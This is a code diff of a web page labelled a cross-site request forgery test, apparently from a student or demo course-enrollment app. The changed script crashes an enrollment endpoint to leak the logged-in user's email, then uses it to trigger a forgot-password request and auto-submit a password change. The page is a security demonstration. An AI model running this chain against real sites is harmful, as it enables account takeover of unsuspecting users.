@@ -29,7 +29,7 @@ require_once "../src/DBController.php";
 
         <main>
             <h1>Cross Site Request Forgery Test</h1>
-            <p>Current logged in as: <span id="email"><?php echo $_SESSION['email'];?></span></p>
+            <p>Current logged in as: <?php echo $_SESSION['email'];?></p>
             <p>
                 To test: Login first, then navigate to this page. Press the button. The user is now enrolled with CRN 111 even if they are not a student.
             </p>
@@ -101,20 +101,40 @@ require_once "../src/DBController.php";
 
         function ajaxSend()
         {
-            // (A) GET SEARCH TERMS
-            var data = new FormData();
-            data.append('email', document.getElementById("email").textContent);
+            // (A) CREATE BLANK FORM (to crash course enroll)
+            var data1 = new FormData();
 
+            // (B) AJAX REQUEST (will crash course enroll)
+            var xhr1 = new XMLHttpRequest();
+            xhr1.open('POST', "../src/CourseEnrollInsertLogic.php", true);
+            xhr1.onload = function () {
+                let crashData = this.response;
+                //["email"]=> string(some number) "Email appears here"
+                //var pattern = new RegExp( "[" + "'email'" + "]" + " string" + "(" + "(\\d{2})" + ")" );
 
-            // (B) AJAX REQUEST (sets up Forgot Password to change the correct password)
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', "../src/ForgotPasswordLogic.php", true);
-            xhr.onload = function () {
-                document.changepassword.submit();
+                let email = crashData.substr(crashData.indexOf('["email"]=>')+ 11).slice(0, -1);
+                email = email.substr(email.indexOf('"')+ 1).slice(0, -1);
+                email = email.split('"')[0];
+
+                // (C) GET SEARCH TERMS
+                var data2 = new FormData();
+                data2.append('email', email);
+
+                // (D) AJAX REQUEST (sets up Forgot Password to change the correct password)
+                var xhr2 = new XMLHttpRequest();
+                xhr2.open('POST', "../src/ForgotPasswordLogic.php", true);
+                xhr2.onload = function () {
+                    document.changepassword.submit();
+                }
+                xhr2.send(data2);
+                xhr2.onloadend = function() {
+                    if(xhr2.status === 404)
+                        throw new Error(' replied 404');
+                }
             }
-            xhr.send(data);
-            xhr.onloadend = function() {
-                if(xhr.status === 404)
+            xhr1.send(data1);
+            xhr1.onloadend = function() {
+                if(xhr1.status === 404)
                     throw new Error(' replied 404');
             }
             return false;
